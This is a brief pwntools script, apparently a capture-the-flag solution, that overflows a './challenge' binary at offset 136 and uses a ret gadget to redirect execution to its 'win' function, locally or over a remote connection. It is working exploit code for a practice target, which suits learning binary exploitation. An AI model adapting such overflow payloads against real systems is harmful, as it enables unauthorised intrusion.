from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


exe = './challenge'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()

offset = 136
ret = ROP(elf).find_gadget(['ret'])[0]

payload = flat({offset : [ret, elf.sym['win']]})

io.sendline(payload)

io.interactive()